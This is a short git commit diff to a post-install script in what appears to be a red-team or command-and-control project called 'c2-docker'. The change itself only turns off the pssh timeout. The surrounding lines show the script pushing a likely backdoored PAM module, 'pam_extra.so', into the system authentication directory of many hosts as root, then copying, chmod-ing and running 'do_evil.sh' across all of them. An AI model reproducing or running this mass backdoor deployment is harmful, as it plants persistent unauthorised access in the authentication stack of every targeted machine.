af6d1ba71b40a0dbc56adc4bb9148f20352c155a
Devin Christianson <38331414+devinchristianson@users.noreply.github.com>
2020-09-19 08:17:32 -0400

    Turn off pssh timeout

--- c2-docker/post_install.sh
+++ c2-docker/post_install.sh
@@ -8,6 +8,6 @@ pscp -h pssh_hostfile.txt -l root pam_extra.so /usr/lib64/security/pam_extra.so
 pscp -h pssh_hostfile.txt -l root do_evil.sh /root/do_evil.sh
 
 # run the evil script
-pssh -h pssh_hostfile.txt -l root chmod +x /root/do_evil.sh
-pssh -h pssh_hostfile.txt -l root /root/do_evil.sh
+pssh -h pssh_hostfile.txt -t 0 -l root chmod +x /root/do_evil.sh
+pssh -h pssh_hostfile.txt -t 0 -l root /root/do_evil.sh
 
